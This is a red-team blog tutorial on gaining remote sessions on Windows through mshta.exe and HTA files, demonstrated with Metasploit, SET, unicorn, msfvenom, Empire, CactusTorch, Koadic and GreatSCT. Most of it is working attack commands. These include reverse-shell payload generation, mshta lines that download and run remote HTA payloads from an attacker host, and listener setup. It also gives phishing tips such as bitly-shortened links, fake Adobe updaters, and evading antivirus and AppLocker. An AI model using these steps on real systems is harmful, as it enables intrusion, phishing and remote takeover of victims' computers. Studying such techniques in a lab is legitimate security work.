<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a>, <a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/" rel="category tag">Windows Exploitation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Exploitation: mshta</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-exploitation-mshta/" rel="bookmark"><time class="entry-date published" datetime="2019-01-22T07:15:32+00:00">January 22, 2019</time><time class="updated" datetime="2025-05-16T11:14:01+00:00">May 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to learn about different methods of HTA attack. HTA is a useful and important attack because it can bypass application whitelisting.  In our previous article, we had discussed on “<a style="color: #000000;" href="//www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/"><strong>Windows Applocker Policy – A Beginner’s Guide</strong></a>” as they define the AppLocker rules for your application control policies and how to work with them. But today you will learn how to bypass Applocker policies with mshta.exe.</span></p>
<p><span style="color: #000000;"> And to learn different methods of the said attack always come handy.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction</span></strong></li>
<li><strong><span style="color: #000000;">Importance of HTA</span></strong></li>
<li><strong><span style="color: #000000;">Different methods</span></strong></li>
<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">For a long time, attackers have utilized HTA files as part of drive-by web assaults or droppers for malware within the wild. This includes doing something as basic as diverting mobile clients and informing them that the website doesn’t, however, have mobile support. Cybersecurity professionals recognize HTA files as one of those “retro” ways valuable to bypass application whitelisting in both red teaming and blue teaming.</span></p>
<p><span style="color: #000000;"><strong>Mshta.exe</strong> runs the Microsoft HTML Application Host, the Windows OS utility responsible for running <strong>HTA</strong>( HTML Application) files. HTML files that we can run JavaScript or Visual with. You can interpret these files using the Microsoft MSHTA.exe tool.</span></p>
<h3><span style="color: #800000;">Importance of HTA</span></h3>
<p><span style="color: #000000;">Finally, utilizing htaccess files or other strategies to divert based on browser sorts will help increase victory rates. Utilizing HTA files for web-based assaults. There’s a ton of adaptability inside an HTA file; you’ll effectively make it appear to be an Adobe updater, secure record per user, and a number of other things. It would moreover be useful to have the HTA file over HTTPS constraining discovery rates for companies not utilizing a few sorts of SSL interception/termination. HTA records help to bypass antivirus since they are still not well identified. Last but not least HTA can also be used in web phishing, replacing old Java Applet attack.</span></p>
<h3><span style="color: #800000;">Different Methods</span></h3>
<p><span style="color: #000000;">There are multiple methods for an HTA attack. And we are going to shine a light to almost all of them. Methods we are going to study are:</span></p>
<ul>
<li><span style="color: #000000;">Metasploit</span></li>
<li><span style="color: #000000;">Setoolkit</span></li>
<li><span style="color: #000000;">Magic unicorn</span></li>
<li><span style="color: #000000;">Msfvenom</span></li>
<li><span style="color: #000000;">Empire</span></li>
<li><span style="color: #000000;">CactusTorch</span></li>
<li><span style="color: #000000;">Koadic</span></li>
<li><span style="color: #000000;">Great SCT</span></li>
</ul>
<h4><span style="color: #800000;">Metasploit</span></h4>
<p><span style="color: #000000;"> Our first method is to use an inbuild exploit in Metasploit. For this, go to the terminal in your kali and type :</span></p>
<h5><span style="color: #000000;"><strong>Msfconsole</strong></span></h5>
<p><span style="color: #000000;">Metasploit contain “HTA Web Server” module which generates malicious hta file. This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell. When a user navigates to the HTA file they will be prompted by IE twice before the payload is executed. As the Metasploit will start up, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) &gt; exploit</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-vvzW6HCZvI0/XEa4efhgWII/AAAAAAAAcM4/9ziEBT_tf1kaGONQcWB3U35gTLK0oomWwCLcBGAs/s1600/1.png" alt="Windows Exploitation using MSHTA" width="615" height="168"/></span></p>
<p><span style="color: #000000;">Once the exploit is executed, it will give you an URL link with the extension of .hta. Simultaneously, Metasploit will start the server which allows you to share the file. This link you further have to run in your victim’s PC. Using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta.exe http://192.168.1.109:8080/pKz4Kk059Nq9.hta</pre>
<p><span style="color: #000000;">The usual file extension of an HTA is .hta. We have used the above command because HTA is treated like any executable file with extension .exe, hence, executed via mshta.exe. When hta gets launched by mshta.exe it uses a signed Microsoft binary, allowing you to call PowerShell and inject a payload directly into memory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-e_tywM_US90/XEa4mCYAxNI/AAAAAAAAcNk/637xtFiwrYgC7hvOK6pAKd7XNWucM6apwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Once the above command is executed you will have a session open. To access the session, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 1</pre>
<p><span style="color: #000000;">Thus, you will have your meterpreter session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-37K154t8BYY/XEa4u-OwFRI/AAAAAAAAcOU/vx2v3eKjaCE_gT3YosXM2F0TBB0xZjq6gCLcBGAs/s1600/3.png"/></span></p>
<h4><span style="color: #800000;">Setoolkit</span></h4>
<p><span style="color: #000000;">Our method for HTA attack is through setoolkit. For this, open setoolkit in your kali. And from the menu given choose the first option by <strong>typing 1</strong> to access social engineering tools.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-SiFoPT2_TY4/XEa4zfV3DGI/AAAAAAAAcPA/DNCwuqfBHjwSFwzTGs48Oqw5Ff2OjsalACLcBGAs/s1600/4.png" alt="Windows Exploitation using MSHTA" width="671" height="715"/></span></p>
<p><span style="color: #000000;">From the next given menu, choose the second option by <strong>typing 2</strong> to go into website attack vendors.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-OIblAq20dko/XEa4z-7jmCI/AAAAAAAAcPI/xfbb8bXDej8-gCgXSJSHHUZizqm5KQiQwCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">From the further given menu choose <strong>option 8</strong> to select the HTA attack method.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-4nQu5qan2P0/XEa40Ah5QEI/AAAAAAAAcPM/KSmxNOrz3Okc3KDCHso7RLUmYrjkGOgjACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Once you have selected the option 8 for HTA attack, next you need to select <strong>option 2</strong> which will allow you to clone a site. Once selected the option 2, it will ask the URL of the site you want to clone. Provide the desired URL as here we have given ‘<strong><em>www.ignitetechnologies.in’</em></strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-uyK59X6pg6o/XEa40eWsGaI/AAAAAAAAcPQ/Qr870h4ZpGYaRCVhNs6En7M24XHmI9SfwCLcBGAs/s1600/7.png" alt="Windows Exploitation using MSHTA" width="893" height="806"/></span></p>
<p><span style="color: #000000;">After giving the URL it will ask you to select the type of meterpreter you want. Select the third one by <strong>typing 3</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-5rnSz4tcyfo/XEa40iT1U2I/AAAAAAAAcPU/652vt9f0S309Le_JkEHCCeCuJAMmWbOygCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Once you hit enter after typing 3, the process will start and you will have the handler (multi/handler)</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-EC6-U7Ar4cM/XEa403kG09I/AAAAAAAAcPY/OEVWgk6ghYwnURKk5F2nuU4SD3p_EkcRACLcBGAs/s1600/9.png" alt="Windows Exploitation using MSHTA" width="739" height="317"/></span></p>
<p><span style="color: #000000;">Now convert your malicious IP into bitly link which will appear more genuine to victims when you will share this link with them.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-ZUf9tF-4rm4/XEa4fPlqHqI/AAAAAAAAcM8/NwfWz0auFrAc_FH-pGwRLYCI3bMN__K1gCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">When the victim will browse the above malicious link, the file will be saved and automatically executed in the victim’s PC after being saved; as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Gi2Ez7XAwps/XEa4gXXoAOI/AAAAAAAAcNA/vPoloSV4XHkyBOYmYu7Ej_d8cLWadLVJwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Then you will have your meterpreter session. You can use the command ‘sysinfo’ to have the basic information about the victim’s PC.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-xy8Fh45Jqds/XEa4h1ggVVI/AAAAAAAAcNI/__LBKDN7g-0Y6o3UTqNEc5ummCLd8a5BgCLcBGAs/s1600/12.png" alt="Windows Exploitation using MSHTA" width="739" height="300"/></span></p>
<h4><span style="color: #800000;">Magic Unicorn</span></h4>
<p><span style="color: #000000;">The next method for HTA attack is using unicorn third-party tool. The tool magic unicorn is developed by Dave Kennedy. It is a user-friendly tool which allows us to perform HTA attack by injecting shellcode straight into memory. The best part of this tool is that it’s compatible with Metasploit, along with shellcode and cobalt strike. You can have a detailed look at the software at trustedsec.com, and you can download the software from GitHub or just by using this <strong><a href="https://github.com/trustedsec/unicorn">link</a></strong></span></p>
<p><span style="color: #000000;">Once you have downloaded magic unicorn. Open it in the terminal of kali and type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.109 1234 hta</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Hl1aK5uLNF4/XEa4g0AZgJI/AAAAAAAAcNE/8ZPG7JGIpqw0R77a_mSgJUk-KQEkBC6ZQCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Executing the above command will start the process to create a .hta file. The said .hta file will be created in a folder hta-attack/. Go into that folder and see the list of files created by typing the following commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd hta_attack/
ls</pre>
<p><span style="color: #000000;">Now you will be able to see a .hta file i.e. Launcher.hta. Start the python server so the file can be shared. To do so, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-0hsXIxZTGSM/XEa4h6YfbAI/AAAAAAAAcNM/yecemhMPQH4XuVxa4De8e5mDwEsxuHi3gCLcBGAs/s1600/14.png" alt="Windows Exploitation using MSHTA" width="870" height="260"/></span></p>
<p><span style="color: #000000;">Once the server is up and running execute the following command in the cmd prompt of the victim’s PC :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta.exe http://192.168.1.109/Launcher.hta</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-DVhRZguXQ6Y/XEa4iBfgZAI/AAAAAAAAcNQ/8OZTcdBIW3odeKG2muDWQn-WJwFyH961ACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">When the above command will be executed, you will have your session activated in the multi/handler. To access the session, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 1</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-kLj4RYTxdOc/XEa4joSVfAI/AAAAAAAAcNU/4CMA3y6S5pU8qkEDMgC2orqfuj61uye6gCLcBGAs/s1600/16.png"/></span></p>
<h4><span style="color: #800000;">MSFVenom</span></h4>
<p><span style="color: #000000;">The next method of HTA attack is by manually creating a .hta file through msfvenom. Create a .hta file, type the following command in the terminal of kali:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f hta-psh &gt; shell.hta</pre>
<p><span style="color: #000000;">Executing the above command will create a .hta file that you can use to your advantage. After creating the file, turn on the python server to share the file to the victim’s PC by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-Ruv-nD7OyqE/XEa4k7Hm_xI/AAAAAAAAcNc/Kc2M93g27QwJzAVKtJoPxJFHGQiDzIEzgCLcBGAs/s1600/17.png" alt="Windows Exploitation using MSHTA" width="1027" height="163"/></span></p>
<p><span style="color: #000000;">Run the above file by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta.exe http://192.168.1.109/shell.hta</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Qj6fHpGuWL4/XEa4j99HmxI/AAAAAAAAcNY/pkaH-w7FCMUSohA0Xh_3j3qnbOAyaUoXwCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Simultaneously, start your handler to receive a session when you run the above file in the victim’s cmd prompt. To start the multi/handler type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">And so, with using such an easy method, you will have your session of meterpreter. You can use sysinfo to know the basics of the victim’s PC.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-weCni1uv0YE/XEa4mB8_HRI/AAAAAAAAcNg/HkuFwNOjdlEdp2C1paPWPjA2-h-VE7P5ACLcBGAs/s1600/19.png" alt="Windows Exploitation using MSHTA" width="718" height="404"/></span></p>
<h4><span style="color: #800000;">PowerShell Empire</span></h4>
<p><span style="color: #000000;">For our next method of HTA Attack, we will use empire. Empire is a post-exploitation framework. Till now we have paired our hta tacks with Metasploit but in this method, we will use empire framework. It’s solely a python-based PowerShell windows agent which makes it quite useful. Empire is developed by @harmj0y, @sixdub, @enigma0x3, rvrsh3ll, @killswitch_gui, and @xorrior. You can download this framework from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/BC-SECURITY/Empire"><strong>Here</strong></a></span></span></p>
<h5 data-pm-slice="1 1 []"><strong><span style="color: #000000;">Checking for Active Listeners</span></strong></h5>
<p><span style="color: #000000;">To have a basic guide of Empire, please visit our article <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">introducing empire</a></span>:</span></p>
<p><span style="color: #000000;">Once the empire framework is started, type listener to check if there are any active listeners. As you can see in the image below that there are no active listeners. So to set up a listener type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistener http
set Host http://192.168.1.109
set port 80
execute</pre>
<p><span style="color: #000000;">With the above commands, you will have an active listener. Type back to go out of listener so that you can initiate your PowerShell</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-AIXTBWfZ_84/XEa4nmYvuhI/AAAAAAAAcNo/QWOzKjC5YQoLAM0JxgOVkzpaC1AtkxUcACLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">For our HTA attack, we will use a stager. <strong> </strong>A stager, an empire, is a snippet of code that allows our malicious code to be run via the agent on the compromised host. So, for this type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/hta
set Listener http
set OutFile /root/Desktop/1.hta
execute</pre>
<p><span style="color: #000000;">usestager will create a malicious code file that will be saved in the outfile named 1.hta. And once the file runs, we will have the result on our listener. Run the file in your victim’s by typing the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta.exe http://192.168.1.109:8080/1.hta</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-mxMAp_9Dp_c/XEa4orPArxI/AAAAAAAAcNw/citfmcvjfNQ_TgZWu-CIJ1_OODIMO_SVgCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">To see if we have any session open type ‘agents’. Doing so will show you the name of the session you have. To access that session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact L924Z1WR</pre>
<p><span style="color: #000000;">The above command will give you access to the session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo
info</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-wuYB8QzSaNk/XEa4oiloI5I/AAAAAAAAcNs/CigC7jOD0E0i8n-bH8k1lVHUwj_S1rihQCLcBGAs/s1600/22.png" alt="Windows Exploitation using MSHTA" width="907" height="842"/></span></p>
<h4><span style="color: #800000;">Cactustorch</span></h4>
<p><span style="color: #000000;">Cactustorch is a framework for javascript and VBScript shellcode launcher. It is developed by Vincent Yiu. This tool can bypass many common defences which is an advantage for us till now. The major thing to note is that we create the code in cactustorch using msfvenom and then encode it into Base64, as it only supports that.</span></p>
<p><span style="color: #000000;">So, to start with let’s first make our malware and then encrypt it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f raw &gt; 1.bin</pre>
<p><span style="color: #000000;">Now to encrypt the file type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat 1.bin |base64 -w 0</pre>
<p><span style="color: #000000;">Copy the base64 code as it is to be used later.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-87EZJz-cWRo/XEa4pA5n6qI/AAAAAAAAcN0/f1kaAzlHRRs_Ad9Wcw5ZVBhOVhJYVShIACLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now that we have our malware ready, let’s download cactustorch. You can download it from here:</span></p>
<p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH"><span style="color: #0000ff;"><strong>https://github.com/mdsecactivebreach/CACTUSTORCH</strong></span></a></p>
<p><span style="color: #000000;">Once it’s installed type the following to the content of the folder installed:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -la
./CACTUSTORCH.hta</pre>
<p><span style="color: #000000;">The above command will start cactustorch for hta attack.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-Jq1Eyqo6DqA/XEa4psq_dGI/AAAAAAAAcN4/QBASalkrPZcjLy9yP1IlheWgvg6dFGvtgCLcBGAs/s1600/24.png" alt="Windows Exploitation using MSHTA" width="784" height="402"/></span></p>
<p><span style="color: #000000;">Once the cactustorch starts, paste the base64 code, at the highlighted space as shown in the image below, which was copied earlier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-Ix9sXpDS_RI/XEa4rDPZZiI/AAAAAAAAcN8/c2due1mwDCoapkC0Eils9Q36BUtXpeWYQCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">As we have added our code, let’s execute the file in our victim’s PC by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta.exe http://192.168.1.109/CACTUSTORCH.hta</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-hQC98X_i1Fs/XEa4sXGF2VI/AAAAAAAAcOE/35Y6da3RfZAnW3bHkb05ykudym3nXHzmgCLcBGAs/s1600/26.png" alt="Windows Exploitation using MSHTA" width="549" height="108"/></span></p>
<p><span style="color: #000000;">Simultaneously, start your multi/handler to receive a session. For multi/handler type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">Once you execute the file in the victim’s PC, you will have your session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-_J-cJ4YtRiQ/XEa4sVvkwtI/AAAAAAAAcOA/B-7TOqf844Aj0aBCVk_jPNVIVM-oK5ORACLcBGAs/s1600/27.png"/></span></p>
<h4><span style="color: #800000;">Koadic</span></h4>
<p><span style="color: #000000;">Our next method is using Koadic. Koadic, or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. To know more about Koadic please read our detailed articled on the said framework through this link:  <span style="color: #0000ff;"><a style="color: #0000ff;" href="//www.hackingarticles.in/koadic-com-command-control-framework"><em>//www.hackingarticles.in/koadic-com-command-control-framework</em></a></span></span></p>
<p><span style="color: #000000;">Once the koadic is up and running, type info to get a list of details you need to provide in order to have a session. Through info, you know that you need to provide srvhost along with setting endpoint. So to set them type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set srvhost 192.168.1.107
set ENDPOINT sales
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-gKBWN2C-hl4/XEa4tixIVEI/AAAAAAAAcOI/S8moLrT3pIMAaULkPpB8XPRHcEApXRGKACLcBGAs/s1600/28.png"/></span></p>
<p><span style="color: #000000;">Execute you’re the file in your victim’s PC by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.107:9999/sales</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-aQJvNkgIDmE/XEa4uU6h-5I/AAAAAAAAcOM/r-weqDuuYnEcPuSfcDajgMTDCM0M1zL9gCLcBGAs/s1600/29.png" alt="Windows Exploitation using MSHTA" width="650" height="232"/></span></p>
<p><span style="color: #000000;">And you will have a session up and running. To know the name of session type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zombies</pre>
<p><span style="color: #000000;">And now to access the session type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zombies 0</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-VBiC3oQAf_w/XEa4v8k76DI/AAAAAAAAcOY/WnPXnnqoggcHD135E38kgk5LWU3V7RMbQCLcBGAs/s1600/30.png"/></span></p>
<h4><span style="color: #800000;">GreatSCT</span></h4>
<p><span style="color: #000000;">GreatSCT is a tool that allows you to use Metasploit exploits and lets it bypass most anti-viruses. It is currently under support by @ConsciousHacker. You can download it from <a href="https://github.com/GreatSCT/GreatSCT"><span style="color: #0000ff;"><strong>here</strong></span></a></span></p>
<p><span style="color: #000000;">Once it’s downloaded and running, type the following command to access the modules:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use Bypass</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-I0-wO2wH8xY/XEa4wc64lWI/AAAAAAAAcOc/I9aDXcqwrEEfGGQoY1JhX0rUoFYXfRa2QCLcBGAs/s1600/31.png" alt="Windows Exploitation using MSHTA" width="733" height="356"/></span></p>
<p><span style="color: #000000;">Now to see the list of payloads type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">list</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-kG_Tgdt0_C0/XEa4wldPjZI/AAAAAAAAcOg/nrSeamoMGGI9x9wmMPD8kYEn5HvvP06GwCLcBGAs/s1600/32.png"/></span></p>
<p><span style="color: #000000;">Now from the list of payloads, you can choose anyone for your desired attack. But for this attack we will use :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use mshta/shellcode_inject/base64_migrate.py</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-6lr_UKZfkIQ/XEa4xZjbjzI/AAAAAAAAcOk/LSltuoKcX7olOtRA1veIk5bVmmYpNVXBQCLcBGAs/s1600/33.png" alt="Windows Exploitation using MSHTA" width="780" height="807"/></span></p>
<p><span style="color: #000000;">Once the command is executed, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">generate</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-y83SKj92910/XEa4x2qETxI/AAAAAAAAcOo/7fiUHrrA9vYOPoJnJYBu_bckn6O2FEzFQCLcBGAs/s1600/34.png"/></span></p>
<p><span style="color: #000000;">After executing generate command, it asks you which method you want to use. As we are going to use msfvenom type 1 to choose the first option. Then press enter for meterpreter. Then provide lhost and lport i.e. 192.168.1.107 and 4321 respectively.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-yK4NIRTR3RE/XEa4x9qhFYI/AAAAAAAAcOs/M6_dp8UYmUoisfGRfrhHwwN0Cl63Bci7ACLcBGAs/s1600/35.png" alt="Windows Exploitation using MSHTA" width="783" height="419"/></span></p>
<p><span style="color: #000000;">When generating the shellcode, it will ask you to give a name for a payload. By default, it will take ‘payload’ as a name. As I didn’t want to give any name, I simply pressed enter.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-CYixhMqZUr4/XEa4yHXcrnI/AAAAAAAAcOw/ByPXIGWiKHQh0DXX9bIrbznYl65Pf1JhQCLcBGAs/s1600/36.png"/></span></p>
<p><span style="color: #000000;">Now, it made two files. One resource file and other an hta file.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-2l-WPX5RMGA/XEa4ybiYyAI/AAAAAAAAcO0/qPHfbCPSa9Qb2TzTJdWhzjyi2K3bSbvTwCLcBGAs/s1600/37.png" alt="Windows Exploitation using MSHTA" width="787" height="304"/></span></p>
<p><span style="color: #000000;">Now, firstly, start the python’s server in /usr/share/greatsct-output by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-SGetKUupazE/XEa4ybiRhKI/AAAAAAAAcO4/-kGjiShuTiIfuwc14zvVfHbP-O3yrzZDQCLcBGAs/s1600/38.png"/></span></p>
<p><span style="color: #000000;">Now execute the hta file in the command prompt of the victim’s PC.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-4Vgo2-dOUy4/XEa4zY3ktqI/AAAAAAAAcO8/hC3W3p0ct_EKpgZvsHJdWgBPLDo940v6gCLcBGAs/s1600/39.png"/></span></p>
<p><span style="color: #000000;">Simultaneously, start the multi/handler using recourse file. For this, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</pre>
<p><span style="color: #000000;">And voila! You have your session.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-kt3wGZrAMzU/XEa4zvaCKQI/AAAAAAAAcPE/fnVyDnLVUy0PDW4YqgqOJKp8SwiJJwOWwCLcBGAs/s1600/40.png" alt="Windows Exploitation using MSHTA" width="856" height="529"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Conclusion</span> </span></h3>
<p><span style="color: #000000;">So basically, this type of attack is a simple HTA attack that provide full access to the remote attacker. An attacker can create a malicious application for the Windows operating system using web technologies to clone a site. In a nutshell, it injects PowerShell through HTA files that attackers can use for Windows-based PowerShell exploitation through the browser. The methods above illustrate the attack. As they say, if one door closes, another opens; therefore, learning the same attack in different ways is often convenient.</span></p>
<p><span style="color: #000000;">To learn more about Windows Exploitation. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact</span> <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
